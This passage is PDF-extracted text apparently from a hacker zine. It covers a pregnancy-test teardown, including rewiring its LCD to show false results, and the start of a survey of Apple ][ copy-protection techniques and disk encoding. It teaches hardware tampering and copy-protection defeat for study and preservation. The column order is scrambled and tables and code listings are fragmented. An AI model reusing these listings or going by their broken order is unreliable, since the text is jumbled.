the battery type to confirm it’s 3V, or just read
the CE-mark label on the outside of the DPT that
lists the part number, lot data, confirmation that
this test is made by SPD GmbH out of Geneva,
Switzerland (made in China), and that the test runs
on 3V DC. Safety first, kids. Also convenient: if
you peel up this label, you’ll see holes in a pat-
tern of the case that line up with un-tinned pads on
the PCB. These are the calibration and test points
for the Holtek, which means if you prefer firmware
reverse-engineering to hardware reverse-engineering,
you can go fiddle with the insides from the outside.
By the by, that label isn’t tamper-evident. You
can easily replace it. Don’t get any ideas!
Teardown
To open the case of a digital pregnancy test (DPT),
take a nickel or quarter, place it in the detent in the
injection molded case, and gently twist. The model
of DPT I did most of my work with was the generic
“CVS Clear Results,” test – the mechanical specifics
may vary from brand to brand, but the nicest part of
the cheap injection-molded plastic is that the shell
parts are universally thin-walled and toleranced to
snap-fit together, which makes it easy to snap them
apart without visibly damaging the case.
Inside that case, there will be a circuit board
that has another multi-piece injection-molded as-
sembly of ABS plastic, press-fitted into mounting
holes on the PCB. This is the test strip alignment/e-
jection mechanism. 30 For my purposes, I removed
this semi-destructively, by twisting off the retention
pins on the back side of the PCB. I wanted to save
30 unzip
6.4
Schematic
Flick the little button, and you’ll see the whole test
light up (with or without a strip). The LEDs strobe,
the LCD thoughtfully blinks its “thinking” icon, and
a scope or DMM will show plenty of pin activity
until the test errors out because you just set it off
pocorgtfo10 pregpatent.pdf
33H9
H9
LCD1
T21
R12
H9
U5
H9
T24
U1
LCD2
C3
R10-S
T15
T23
T22
T20
R10-N
T16
R12-E
C1
T19
H9
Q1
Q2
R3
T3
T2
D3
T8
R7
R1
T1
D1
D2
SW1
T8
T9
VCC
R10
R2
T4
T6
D1
T12
T10
T17
R11
T7
T9
T27
T28
C2
R8
T11
T13
T14
T6
T25
T26
R4
R5
R12-W/R10-N
T18
T12
T5
R6
R10-S
D5
D4
T10
R9
Then add your traces. Use the vias to register the
two images on top of one another for a single layout
trace.
Step 6. Annotate the trace with the reference
designators from an intact PCB. Add your own net
names and pin labels. Use this to build a reference
schematic.
without a valid test strip. I could have started prob-
ing there, but I realized that an optical test requires
a dark environment, and I wanted to bring my test
wires out through the conveniently placed unit-test-
and-programming holes on the case. My ultimate
goal was to test the unit under multiple conditions
to determine the internal logic. That meant making
a schematic.
I don’t enjoy tracing out circuits with dark sol-
dermask, and the DPTs are relatively cheap, so I
gathered up the pinouts for each IC and then did
my physical net trace using graphic design tools.
Step 1. Desolder all components from the PCB.
Step 2: Scrub the pads with solder wick to get
them nice and flat.
Step 3. Using a razor blade or fine-grit sandpa-
per, sand off the soldermask with loving attention
on both sides of the PCB.
Step 4. Scan the PCB with high contrast.
Step 5. Import the scans into an illustration tool
of your choice. Color code the top vs. bottom scans
to match your preferred layout scheme. Drop circles
on the vias—first. Then add the IC and passive pins.
6.5
Let’s Skip the Firmware
Let’s walk through what this sweet little circuit is
up to.
First off, the Holtek micro is always on, albeit
in sleep mode. The battery is sized for the shelf life
of the device plus a couple of uses (three strips ship
with each one). When a test strip is placed in the
tester, it mechanically triggers the switch which a)
flags an interrupt to the microcontroller to wake it
up out of sleep mode and b) enables power to the
PLL and sense circuitry that would not otherwise
be powered. If you remove the test strip mid-test,
it cuts power to the PLL and the micro will error
out, making it a bit of a pain to work with. Meh,
34meh, power-saving feature and fault reporting dur-
ing foreseeable misuse.
Once all supplies are up, the Holtek samples the
state of the optical sensor four times a second for
twenty iterations, averaging the samples. In order
to sample the test strip, the Holtek drives the LEDs
and then reads back the output state of the photode-
tector, using the voltage-controlled-isolator (VCO)
sub-function of that phase-lock-loop IC. The role
of the VCO is to convert the analog voltage from
the photodetector into a square wave for easy edge
counting. Higher voltage implies a higher frequency
of edges. Because the micro controls the LED exci-
tation timing, it can easily tell by edge counts what
color test strip the LEDs might be illuminating. It’s
pretty nifty.
Because I wanted to build new electronics to
fit inside the case of the original DPT and repro-
duce a function similar to the original hardware and
firmware, I dove into the deeper specifics of how the
DPT detects whether one or two blue stripes show
up in that plastic clear-view window. The secret is
stereoscopic vision enabled by time-division multi-
plexing and the physical layout of the optosensor.
The three LEDs are interdigitated with two parallel
photodiodes that are the base current sources in a
PNP common emitter amplifier (D4, D5, Q2). The
Holtek enables each of the 3 LEDs (D1, D2, D3) se-
quentially using a 25% LOW duty cycle waveform
at 10kHz. The LEDs are strobed in a round-robin
fashion and the Holtek samples the result via the
VCO.
When any one of the three LEDs is strobing, the
induced current in the photodiode causes the filter
cap on the output of Q2 to charge. The LED’s light
causes charging, while discharging occurs while the
LED is off. Because the Holtek excites the LEDs
intermittently, the output of the photodetector is a
sawtooth wave. The period of the sawtooth is the
LED drive interval, while the peak and trough of
the sawtooth wave correspond to the colorimetric
intensity of the test stripe that appears and/or the
amount of mis-alignment between the photodetector
and the LED array.
But how does this produce stereoscopic vision,
you ask?
For the same background test strip, when D1 is
on, the sawtooth peak-to-peak amplitude will be dif-
ferent than when D3 is on, giving the sensor some
ability to resolve spatial light sources. Because the
LEDs are independently addressable, it also means
that the Holtek can discriminate between a colored
stripe hanging over D5 (stripe #1) versus one hang-
ing over D4 (stripe #2). Also, all apologies for
the fact that the reference designator order for the
diodes makes no physical sense. It’s not how I’d de-
sign the board, but it apparently took eight revisions
for the manufacturer to get this far.
6.6
Schrödinger’s Rabbit
Okay, so if you’re pregnant, it works like this.
Just kidding, folks—here’s what the DPT is doing.
Photodetectors
Test Stripe
D3 D1 D2
ST1
ST2
PREGO
L
H
L
CNTRL PREGO
CNTRL
L
H
H
CNTRL
...
ERROR H
H
L
...
PREGO
BLANK
H
H
H
...
...
Remember that a high PD voltage implies more
edges counted by the Holtek per excitation cycle.
The Holtek uses this and sequencing to tell if you’re
pregnant. Based on the chemistry of the test stripe,
the test expects the CNTRL stripe to fire first.
If only the CNTRL stripe fires—congratulations,
you aren’t pregnant! Again, due to chemistry, the
PREGO stripe ought to always fire second, if at all.
If the stripes fire out of order, that’s an error. If the
PREGO stripe fires but the CNTRL stripe doesn’t,
that’s an error. If no stripe fires, that’s an error.
The factors that contribute to setting the DE-
TECT vs. NO-DETECT threshold for “how many
edges do I expect to count if the rabbit died” are
(1) the distance from each of the three LEDs to each
of the two sensors, (2) the intensity of the LEDs,
(3) the color of the LEDs (as that corresponds to
the sensitivity of the sensors for a given wavelength
of light), (4) the placement of the stripes (if they
appear) with respect to the two photodiodes, and
(5) the color of the stripe and the saturation of the
stripe. Because process controls on LEDs are fuck-
ing horrible, each test has to be individually cali-
brated after assembly.
But that’s good news for us!
356.7
Hands-On Hacking
bother to crack it. Outcome: I can’t give you any
information on its internals other than what I’ve in-
ferred from reverse-engineering the rest of the cir-
cuit. I’d love to see it done, though—just because
the programming physical interface is obfuscated in
the primary datasheet doesn’t mean it’s impossible.
If I were doing this twice, I’d start with the ICE.
The correct ICE tool for the job, assuming you’re
into that, is the CICE48U000006A. In the interest
of speed, I based my redesign on a PIC16F1933 and
a character LCD that fit nicely in the same window
as the original.
The demo worked, but I never got paid. So,
demo code and hardware design files are available
for any neighbor who wants to buy me a beer.
Cheers!
–w0z
Let’s be honest, you don’t want to come up with
a new set of guts to shove into the case of a digi-
tal pregnancy test relabeled 0xBEEF and 0xCAFE for
maximum entertainment and confusion to potential
investors! You just want to have fun with the avail-
able raw materials that God and your local drug-
store have provided.
Each element of the LCD for the digital preg-
nancy test is custom, just like an old Tamagotchi.
That means one pin polarizes the layer with the
test logo artwork on it. A second layer covers “SEE
LEAFLET” for reporting error states, a third conveys
“NOT” and a fourth, “PREGNANT.” A given layer is ac-
tive when the phase of the drive pin is 180 degrees
out of phase with the COMMON pin.
So, let’s go through the pins that make this hap-
pen.
LCD Pin Image
1
Common
2
“NOT”
3
“PREGNANT”
4
“SEE LEAFLET”
5
Logo
See leaflet
Pregnant
Not
Pin 1 is the rightmost pin if you’re looking at the
LCD face and the pins are at the top of the pack-
age, opposite the reference designator. Make sure
to not just short pins—you actually have to lift and
move any pins you might be interested in swapping
around. Cut a wire here, tack in a jumper there.
Mix and match, and get ready to have a ball! Dance
a jig! I mean, shoot, a fella could have a pretty good
weekend in Vegas with all that.
At the time I was doing this work, the Holtek
micro wasn’t available for purchase from Digikey or
Mouser, so in a fit of intellectual incuriosity, I didn’t
3637Peeks,Pokes and Pirates
Disk Layout
Common Code Obfuscation
A 5.25-inch floppy disk has 35 tracks, numbered $00 to $22 (hex).
The format of each track is disk-specific. Most disks split each track
into 16 “sectors,” but older disks use 13 sectors per track. Some
games use 12, 11, or 10. Newer games can squeeze up to 18
sectors in a single track! Just figuring out how data is stored on disk
can be a challenge.
Apples have a built-in “monitor” and naive disassembler.
Confusing this disassembler is not hard!
Self-modifying code
BB03-
BB06-
BB08-
BB09-
Disk Control
BB03- 4E 06 BB
BB06- 38
BB07- 6E 0A BB
Disk Boot
tip: $C600 is read-only. But the code there is surprisingly flexible;
It will run at $9600, $8600, even $1600. If you copy it to RAM,
you can insert your own code before jumping to $0801.
Prologue And Epilogue
D5
prologue AA
/
96
ADDRESS
\
DE
epilogue AA
EB
$B955 $BC7A
$B95F $BC7F
$B96A $BC84
$B991 $BCAE
$B99B $BCB3
-----
$BCB8
0x
D5
prologue AA
/
AD
DATA
\
DE
epilogue AA
EB
read
write
$B8E7 $B853
$B8F1 $B858
$B8FC $B85D
$B935 $B89E
$B93F $B8A3
-----
$B8A8
Know Your Tools
A0 02
8C EC B7
88
8C F4 B7
88
F0 01
6C 8C F0
B7
8C EB B7 LDY
STY
DEY
STY
DEY
BEQ
JMP
???
STY
#$02
$B7EC
AEBF-
AEC1-
AEC2-
AEC5- F0 01
6C
8C F0 B7
8C EB B7 BEQ $AEC2
$B7F4
$AEC2 <-- Y = 0 here, so this branches...
($F08C)
$B7EB
STY $B7F0 <-- ...to here (JMP is never executed)
STY $B7EB
0800-
0802-
0803-
0805-
0806-
0809-
080C-
080D-
080E-
A9 51
48
A9 8E
48
20 5D 6A
4C 00 08
68
68
60
LDA
PHA
LDA
PHA
JSR
JMP
PLA
PLA
RTS
#$0F
<-- push address to stack ($0FFF)
#$FF
$080C
$0800
<-- call subroutine (also pushes to stack)
<-- remove address pushed by JSR
<-- "return" to $0FFF+1 = $1000
JMP at $0809 is never executed! Execution continues at $1000.
Undocumented opcodes
0801- 74
0802- 4C B0 1C
Every pirate needs:
- a NIBBLE EDITOR for inspecting raw nibbles and determining disk
structure (Copy II Plus, Nibbles Away, Locksmith)
- a SECTOR EDITOR for searching, disassembling, patching
sector-based disks (Disk Fixer, Block Warden, Copy II Plus)
- a DEMUFFIN TOOL for converting disks to a standard format
(Advanced Demuffin, Super Demuffin)
- a FAST DISK COPIER for backing up your work-in-progress!
(Locksmith Fast Disk Backup, FASTDSK, Disk Muncher)
with apologies to Beagle Bros.
AEB5-
AEB7-
AEBA-
AEBB-
AEBE-
AEBF-
AEC1-
AEC4-
AEC5-
Manual stack manipulation
Many protected disks start with DOS 3.3 and change prologue/
epilogue values. Here's where to look:
write
LSR $BB06
SEC
<-- the code has changed!
ROR $BB0A
Branches into the middle of an instruction
A disk is booted in stages, starting from ROM:
$C600 ROM finds track 0 and reads sector 0 into $800
$0801 RAM re-uses part of $C600 code to read more sectors
(usually into $B600+)
$B700 RAM uses RWTS at $B800+ to read rest of disk
read
LSR $BB06 <-- modifies the next instruction
ADC ($6E),Y
ASL
???
By the time $BB06 is executed...
Disk control is through “soft-switches,” not function calls:
$C080-7,X move drive arm (phase 0 off/on, phase 1 off/on... until 3)
$C088,X
turn off drive motor
$C089,X
turn on drive motor
$C08C,X
read raw nibble from disk
$C08D,X
reset data latch (used in desync nibble checks)
(X = boot slot x $10)
0x
4E 06 BB
71 6E
0A
BB
???
JMP $1CB0
<-- huh?
$74 is an undocumented 6502 opcode that does nothing, but takes a
one-byte operand. Here is what actually executes:
0801- 74 4C
0803- B0 1C
DOP $4C,X
BCS $0821
<-- actually a branch-on-carry (not a JMP)
JMP at $0802 is never executed!
am
4
to deprotect
and preserve
38
CC BY 4.0 - Ange Albertini 20157
A Brief Description of Some Popular Copy-Protection Techniques
on the Apple ][ Platform
by Peter Ferrie (qkumba, san inc)
7.2
§
7.9
7.10
7.11
7.12
7.13
7.14
7.15
7.16
7.17
7.18
7.19
7.20
7.21
7.1
Write-protection
Sector-level protections
Track-level protections
Illegal opcodes
CPU bugs
Magic stack values
Obfuscation
Virtual machines
ROM regions
Sensitive memory locations
Catalog tricks
Basic tricks
Rastan
Isn’t it ironic
4am 36 declined to write this document himself, but
his work and approval inspired me to do it instead.
Since his collection is so varied, and his write-ups
so detailed, they served as a rich source of informa-
tion, which I coupled with my own analyses, to fill
in the gaps for titles that I don’t have. Everyone
knows already that he’s funny, but he’s also quite
friendly and very generous. Together, we corrected
a few mistakes in the write-ups, so I gave something
back. I even consider us friends now, so I think that
I got the better deal.
While I don’t regret writing this paper, I do have
to say that, considering the time and effort that it
required, he probably made a wise decision. . . ;-)
I have tried to associate at least one example of a
real program for each technique, but in Section 7.20
you’ll find some nifty new protection techniques that
I’ve developed just for this paper.
page
44
44
58
62
62
63
63
67
68
68
71
72
73
7.3
Ancient history
Why why why?
Why the Apple ][? It’s because I grew up with the
Apple ][, I learned to code on the Apple ][, I know
the Apple ][.
Why now? Because the disks that were fresh
when the Apple ][ was current are failing, and if we
do not work to preserve them now, some of the titles
will be lost forever.
This paper is dedicated to anyone who has an in-
terest in helping to preserve what’s left, I sincerely
hope it may help to recognise and defeat the copy-
protection that they have come across.
I’ve been. . . let’s call it “preserving” software since
about 1983, albeit under a different name. However,
the most interesting efforts have been recent, requir-
ing skills that I definitely didn’t have until now: I
am the author of the only two-side 16-sector con-
version of Prince of Persia 31 , the six-side 16-sector
conversion of The Toy Shop 32 , the single file con-
version of Joust, Moon Patrol, and Mr. Do!, as
well as the DOS and ProDOS file-based conversions
of Aquatron, Conan 33 , The Goonies, Jungle Hunt,
Karateka, Lady Tut (including the long-lost ending
from side B), Mr. Do!, Plasmania, and Swashbuck-
ler, to name a few. I am also the only one to crack
Rastan cleanly on the IIGS, just 25 years late. 34
Yes, I do 16-bit, too.
I’ve spent 13 years writing articles for the Virus
Bulletin 35 journal. My faithful readers will recog-
nise the style.
7.4
Okay, let’s split
We can separate copy protection into two categories;
they are either What You Have or What You Know.
What You Have protections are generally protected
disks, while What You Know protections are gener-
31 http://pferrie.host22.com/misc/lowlevel14.htm
32 http://pferrie.host22.com/misc/lowlevel15.htm
33 http://pferrie.host22.com/misc/lowlevel16.htm
34 http://www.hackzapple.com/phpBB2/viewtopic.php?t=952
35 http://www.virusbtn.com
36 https://archive.org/details/apple_ii_library_4am
397.5
ally off-disk, such as requests to type in a word from
the manual.
What You Know protections come in several
forms. One is an explicit challenge with immedi-
ate effect; you must answer now to continue. An-
other is an explicit challenge with delayed effect; if
you answer incorrectly now, the game becomes un-
playable later. Yet another is an implicit challenge;
in order to proceed, you should perform an action as
described in the manual, but the game will appear
to be playable without it.
Accept your limitations
The first important component that we will con-
sider in the Apple ][ is the MOS 6502 or 65C02
CPU. These CPUs have no separation of code and
data. That is, they are a Von Neumann, not Har-
vard architecture. All memory and I/O addresses
are executable, and everything that is not in ROM
is writable, including the stack.
Since the stack is writable directly, it introduces
the possibility of tricks relating to transfer of con-
trol. (§7.14.) Since the stack is executable, it intro-
duces the possibility of hosting code. (§7.18.5.)
The CPU has no prefetch queue, only a sin-
gle prefetched byte of the next instruction (which
is why the minimum instruction execution time is
two cycles—one for the instruction, and one for the
prefetch), as the last stage in the execution of the
current instruction. This introduces the possibility
of self-modifying code, including the next instruc-
tion to execute, because any memory write will have
completed before the prefetch occurs. (§7.15.2.)
Infocom were infamous for their use of all three:
Starcross issued a direct challenge with immedi-
ate effect, and you could not even leave the second
room without typing the correct co-ordinates from
the star chart. 37
Spellbreaker 38 issued a direct challenge with de-
layed effect, along the lines of “name the wizard
who. . . ” Any name from their word list is accepted,
but an incorrect answer results in the player receiv-
ing the wrong key. This key cannot unlock a critical
door much later in the game, causing the character
to be killed instead.
Border Zone made use of an implicit challenge.
It required reading the manual in order to know the
correct words to excuse yourself — Oopzi Dazi! 39 —
after bumping into someone, in order to establish
contact with the friendly spy. Failure to make con-
tact within the allotted time ended the game.
7.6
Lay it out for me
The second important component that we will con-
sider in the Apple ][ is the Disk ][ controller. The
Disk ][ controller is a peripheral which is placed in
a slot. It exposes an interface through memory-
mapped I/O, so the various soft-switches can be read
and written, just like regular RAM. The interface
looks like accesses to $C0sX, where s is #$80 plus
the slot times 16, and X is the switch to access.
The Disk ][ controller runs independently of the
CPU. Once the drive is turned on and spinning the
disk, the drive will continue to spin the disk until the
drive is turned off again. The drive rotates the disk
at a fixed speed—approximately 300 RPM, and five
rotations per second, which works out to be 200ms
per rotation. However, the speed varies somewhat
from drive to drive. For 5.25" disks, the data den-
sity is equal across all tracks. At 300 RPM, each
Brøderbund’s Prince of Persia had a variety of
delayed effects, depending on which of the several
copy protection checks failed. One of them included
crashing immediately before showing the closing
scene upon winning the game. That is, after com-
pleting fourteen levels!
However, the What You Have is perhaps the
more interesting, given the vast number of possi-
bilities.
37 http://infocom.elsewhere.org/gallery/starcross/starcross-map.gif
38 http://gallery.guetech.org/spellbreaker/spellbreaker.html
39 http://infodoc.plover.net/manuals/temp/borderzo.pdf
p19
40track holds 50000 bits, which is equal to 6250 8-bit
nibbles.
The data on a disk is simply a stream of bits
to be read. For a 5.25" disk, those bits are usually
gathered into 16 sectors of 256 bytes each, spread
across 35 tracks—256 × 16 × 35 = 143, 360 bytes, or
140kb. When reading from a disk, the Disk ][ con-
troller shifts in bits at a rate equivalent to one bit
every four CPU cycles, once the first one-bit is seen.
Thus, a full nibble takes the equivalent of 32 CPU
cycles to shift in. After the full nibble is shifted in,
the controller holds it in the QA switch of the Data
Register for the equivalent of another four CPU cy-
cles, to allow it to be fetched reliably. After those
four CPU cycles elapse, and once a one-bit is seen,
the QA switch of the Data Register will be zeroed,
and then the controller will begin to shift in more
bits. As a result, programmers must count CPU cy-
cles carefully to avoid missing nibbles fetched by the
controller.
The Disk ][ controller cannot tell you on which
track the head resides. It also cannot tell you on
which sector the head resides. (The Shugart SA400
on which the Disk ][ controller is based does have
this capability via index detector circuits, but that
feature was removed from the Disk ][ controller to
reduce the cost to manufacture it.) As a result, sec-
tors are usually prepended with a structure known
as the “address field”, which holds the sector’s track
and sector number. The controller does not need or
use this information. Only the boot PROM makes
use of it when requested to read a sector. Beyond
that, the information exists solely for the purpose of
the program which interprets it.
gap 1
(40-95b)
...
gap 2
address field
(14-24b)
D5 AA 96
volume
track
sector
checksum
DE AA
data field
gap 3
(5-10b)
opposed to stored and then decoded, in the event
that the sector address is not the desired one. An-
other reason is that it allows a sector to be updated
in-place, by overwriting the data field only, instead
of rewriting the entire track to update all of the sec-
tors.
(If the sector were a single structure, the CPU
time required to verify that the desired sector has
been found is so long that the write would begin af-
ter the start of the sector body and extend beyond
the original end of the sector, overwriting part of
the following sector.)
Between the sectors are dead space, which can
be filled with a sequence of self-synchronizing val-
ues, timing bits, and protection-specific bytes.
The two structures that define a sector are each
bounded by a prologue and an epilogue. The pro-
logues for the address and data fields are composed
of three values. Two of those values are never used
in the sector body, to distinguish the structures from
the sector body, and the third value is different be-
tween the two structures, to distinguish them from
each other. The epilogues for the address and data
fields are composed of two values. One of those val-
ues is common to both epilogues but never used in
the sector body, to distinguish it from the sector
data.
The Disk ][ controller cannot even tell you where
it is within the bitstream. The problem is that
the stream does not have an explicit start and end.
Instead, a specific sequence must be laid on the
track, to form an implicit start. That way, the
hardware can find the start of the stream reliably.
These values are the “self-synchronizing values.” For
DOS 3.3, and systems with a compatible sector for-
mat, the self-synchronising values are composed of
a minimum of five ten-bit “FF”s. A ten-bit “FF” is
eight bits of one followed by two bits of zero. Self-
synchronising values are usually placed before both
structures that define a sector, to allow synchroni-
sation to occur at any point on the disk. However,
this is not a requirement if read-performance is not
a consideration. 40 That is, the fewer the number of
self-synchronizing values that are present, the more
data that can be placed on a track. However, the
fewer the number of self-synchronizing values that
are present, the more the controller must read be-
fore it can enter a synchronized state, and then start
...
D5 AA AD
data (342b)
checksum
DE AA
disk data
Following the address field that defines a sec-
tor’s location on the disk, there is another structure
known as the “data field”, which holds the sector
body. One reason for the separate address and data
fields is to allow the sector body to be skipped, as
40 It is a requirement if the data field can be written independently of its address field. Since the write is not guaranteed to
begin on a byte boundary, the self-synchronizing values are required for the controller to synchronize itself when reading the
data again.
41BIT
to return meaningful data.
Finally, the Disk ][ controller can write—but not
read reliably—arbitrary eight-bit values. Instead, for
reading each eight-bit value, only seven of the bits
can be used—the top bit must always be set, in order
for the hardware to know when all eight bits have
been read, without the overhead of having to count
them. (See §7.10.15 for a deeper discussion about an
effect made possible by the lack of a counter.) In ad-
dition to requiring the top bit to be set, there should
not be more than two consecutive zero-bits in a row
for the modern drive. (The original disk system did
not allow even that. See §7.10.13 for a deeper dis-
cussion about the effect of excessive zeroes )
ALU
CMP
CPX
CPY
AND
ORA
EOR
RMW
ADC
SBC
DEC INC
DEX INX
DEY INY
ASL LSR
ROL ROR
sector-copier will not write new address fields to the
disk. Instead, it will reuse the existing ones, since
only the data field needs to be updated to place
a sector on a track. In any case, the sector-copier
cannot deal easily with deviations from the standard
format, and requires a lot of interaction to copy sec-
tors for which the prologue and/or epilogue values
are not constant. Some sector-copiers can be di-
rected to ignore the sectors that they cannot read,
but obviously this can lead to important data being
missed.
Second is the track-copier. It also relies on sec-
tors being well-defined, with known the values for
the prologues and epilogues. However, it reads the
sectors in the order in which they arrive, and then
writes the entire track in one pass 41 , by itself. It
shares the same limitations as the sector-copier re-
garding reading sectors and discarding the data be-
tween them, but it keeps the sectors in the same
order as they were originally, which can be impor-
tant. (§7.10.9.)
LDA
LDX
LDY load
TAX TXA
TAY TYA
TSX TXS
transfer
stack
CLV
SEC CLC
SED CLD
SEI CLI
BMI
BVS
BEQ
BCS
BPL
BVC
BNE
BCC
PLA PLP
PHA PHP
STA
STX
STY
store
JSR BRK
RTS RTI
JMP
flags
7.7
Third is the bit-copier. Unlike the previous two,
it makes as few assumptions as possible about the
data on the disk. Instead, it treats tracks as the
bitstream that they are, and attempts to measure
the length of the track while reading. 42 It intends
to write the track exactly as it appears on the disk,
including the data between the sectors, in one pass.
Some bit-copiers can be directed to copy the addi-
tional zero-bits in the stream, but there is a limit
to how reliably these bits can be detected, and the
method to detect them can be exploited. Some bit-
copiers can be directed to attempt to reproduce the
layout of the disk across track boundaries. See sec-
tions 7.10.12 and 7.11.3.
NOP
Copy me, I want to travel
Now that we understand the format of data on the
disk, we consider the ways in which that data can
be copied.
First is the sector-copier. It relies on sectors be-
ing well-defined, and requires knowing only the val-
ues for the prologues and epilogues. The sectors are
copied one at a time in sequential order, for each of
the tracks on the disk, discarding the data between
the sectors, and writing new self-synchronizing val-
ues instead. Some sector-copiers rely on DOS to
perform the writing. In order for that to work, the
disk must be formatted first, because that kind of
The most important point about copiers in gen-
eral is that there is simply no way to read data off of
a disk with 100% accuracy, unless you can capture
the complete bitstream on the disk itself, which can
be done only with specialised hardware. There is no
way for software alone to read all of the bits explic-
itly and understand how the controller will behave
while parsing them
41 As
opposed to reading the sectors in sequential order, and then writing the entire track—that would only make it a sector-
copier with a faster write routine.
42 A sector-copier can use the collection of sectors as a basic track length; the bit-copier has no such luxury. Instead, it is left
to “guess”, and might be forced to discard or insert additional data to reconstruct a track of the same length. The difference
occurs when the rotation speed of the drive that is being used to make the copy is not the same as that of the drive that was
used to make the original.
427.8
Super-super decoder ring
10010110
10010111
10011010
10011011
10011101
10011110
10011111
10100110
10100111
10101011
10101100
10101101
10101110
10101111
10110010
10110011
Despite the quite strict requirements regarding the
format of data on the disk, DOS introduced two ad-
ditional requirements regarding the format of data
within a sector. The first requirement is that there
must not be more than one pair of zero-bits in the
value. The second requirement is that there be at
least one pair of consecutive one-bits, excluding the
sign bit.
If we ignore the DOS requirements for the mo-
ment, and consider instead all possible values which
comply with the hardware requirement to have no
more than two consecutive zero-bits, then there are
81 legal values.
10010010
10010011
10010100
10010101
10010110
10010111
10011001
10011010
10011011
10011100
10011101
10011110
10011111
10100100
10100101
10100110
10100111
10101001
10101010
10101011
10101100
(92)
(93)
(94)
(95)
(96)
(97)
(99)
(9A)
(9B)
(9C)
(9D)
(9E)
(9F)
(A4)
(A5)
(A6)
(A7)
(A9)
(AA)
(AB)
(AC)
10101101
10101110
10101111
10110010
10110011
10110100
10110101
10110110
10110111
10111001
10111010
10111011
10111100
10111101
10111110
10111111
11001001
11001010
11001011
11001100
11001101
(AD)
(AE)
(AF)
(B2)
(B3)
(B4)
(B5)
(B6)
(B7)
(B9)
(BA)
(BB)
(BC)
(BD)
(BE)
(BF)
(C9)
(CA)
(CB)
(CC)
(CD)
11001110
11001111
11010010
11010011
11010100
11010101
11010110
11010111
11011001
11011010
11011011
11011100
11011101
11011110
11011111
11100100
11100101
11100110
11100111
11101001
11101010
(CE)
(CF)
(D2)
(D3)
(D4)
(D5)
(D6)
(D7)
(D9)
(DA)
(DB)
(DC)
(DD)
(DE)
(DF)
(E4)
(E5)
(E6)
(E7)
(E9)
(EA)
11101011
11101100
11101101
11101110
11101111
11110010
11110011
11110100
11110101
11110110
11110111
11111001
11111010
11111011
11111100
11111101
11111110
11111111
(95)
(96)
(97)
(9A)
(9B)
(9D)
(9E)
(9F)
(A5)
(A6)
(A7)
(A9)
(AA)
(AB)
(AC)
(AD)
(AE)
(AF)
10110010
10110011
10110100
10110101
10110110
10110111
10111001
10111010
10111011
10111100
10111101
10111110
10111111
11001010
11001011
11001101
11001110
11001111
(B2)
(B3)
(B4)
(B5)
(B6)
(B7)
(B9)
(BA)
(BB)
(BC)
(BD)
(BE)
(BF)
(CA)
(CB)
(CD)
(CE)
(CF)
11010010
11010011
11010100
11010101
11010110
11010111
11011001
11011010
11011011
11011100
11011101
11011110
11011111
11100101
11100110
11100111
11101001
11101010
(D2)
(D3)
(D4)
(D5)
(D6)
(D7)
(D9)
(DA)
(DB)
(DC)
(DD)
(DE)
(DF)
(E5)
(E6)
(E7)
(E9)
(EA)
11101011
11101100
11101101
11101110
11101111
11110010
11110011
11110100
11110101
11110110
11110111
11111001
11111010
11111011
11111100
11111101
11111110
11111111
10110100
10110101
10110110
10110111
10111001
10111010
10111011
10111100
10111101
10111110
10111111
11001011
11001101
11001110
11001111
11010011
(B4)
(B5)
(B6)
(B7)
(B9)
(BA)
(BB)
(BC)
(BD)
(BE)
(BF)
(CB)
(CD)
(CE)
(CF)
(D3)
11010110
11010111
11011001
11011010
11011011
11011100
11011101
11011110
11011111
11100101
11100110
11100111
11101001
11101010
11101011
11101100
(D6)
(D7)
(D9)
(DA)
(DB)
(DC)
(DD)
(DE)
(DF)
(E5)
(E6)
(E7)
(E9)
(EA)
(EB)
(EC)
11101101
11101110
11101111
11110010
11110011
11110100
11110101
11110110
11110111
11111001
11111010
11111011
11111100
11111101
11111110
11111111
(ED)
(EE)
(EF)
(F2)
(F3)
(F4)
(F5)
(F6)
(F7)
(F9)
(FA)
(FB)
(FC)
(FD)
(FE)
(FF)
That leaves us with eight values for which there
is not more than one pair of zero-bits, but also not
one pair of consecutive one-bits, excluding the sign
bit. DOS reserves some of these value for a separate
purpose.
10010101
11010010
11010100
11010101
10100101
10101001
10101010
11001010
(EB)
(EC)
(ED)
(EE)
(EF)
(F2)
(F3)
(F4)
(F5)
(F6)
(F7)
(F9)
(FA)
(FB)
(FC)
(FD)
(FE)
(FF)
(95)
(D2)
(D4)
(D5)
(A5)
(A9)
(AA)
(CA)
That leaves us with 17 values for which there
are not more than two consecutive zero-bits, which
seems like a missed opportunity for a better encod-
ing:
10010010
10010011
10010100
10010101
10011001
10011100
10100100
10100101
If we introduce the first of the DOS requirements
that there not be more than one pair of zero-bits,
then there are only 72 compliant values, as we see
here:
10010101
10010110
10010111
10011010
10011011
10011101
10011110
10011111
10100101
10100110
10100111
10101001
10101010
10101011
10101100
10101101
10101110
10101111
(96)
(97)
(9A)
(9B)
(9D)
(9E)
(9F)
(A6)
(A7)
(AB)
(AC)
(AD)
(AE)
(AF)
(B2)
(B3)
(92)
(93)
(94)
(95)
(99)
(9C)
(A4)
(A5)
10101001
10101010
11001001
11001010
11001100
11010010
11010100
11010101
(A9)
(AA)
(C9)
(CA)
(CC)
(D2)
(D4)
(D5)
11100100 (E4)
Having exactly 64 entries in the table allows us
to represent all of the values using six bits. That
leads us to an encoding method known as “6-and-2
Group Code Recording (GCR)” or more commonly
“6-and-2” encoding.
In “6-and-2” encoding, an eight-bit value is split
into two parts, where the high six bits are separated
from the low two bits. (The disk system for which
DOS 3.2 was first written had an additional restric-
tion that did not allow consecutive zero-bits, and
so used “5-and-3” encoding for the same purpose.)
To encode an entire sector, each of the two-bit val-
ues are gathered together, such that three of them
form another six-bit value in reverse order, and are
stored first, followed by each of the regular six-bit
values. Prior to storing any of the values, they must
be transformed into the values in our table of 64
nibbles. This is done by using the original value as
an index into the nibble table, and writing the value
from the table instead.
(EB)
(EC)
(ED)
(EE)
(EF)
(F2)
(F3)
(F4)
(F5)
(F6)
(F7)
(F9)
(FA)
(FB)
(FC)
(FD)
(FE)
(FF)
If we introduce the second of the DOS require-
ments that there be at least one pair of consecutive
one-bits, excluding the sign bit, then there are only
64 compliant values:
43When we place the original value beside the nib-
ble value, the table looks like this:
00 = 96
10 = B4
20 = D6
30 = ED
01 = 97
11 = B5
21 = D7
31 = EE
02 = 9A
12 = B6
22 = D9
32 = EF
03 = 9B
13 = B7
23 = DA
33 = F2
04 = 9D
14 = B9
24 = DB
34 = F3
05 = 9E
15 = BA
25 = DC
35 = F4
06 = 9F
16 = BB
26 = DD
36 = F5
07 = A6
17 = BC
27 = DE
37 = F6
08 = A7
18 = BD
28 = DF
38 = F7
09 = AB
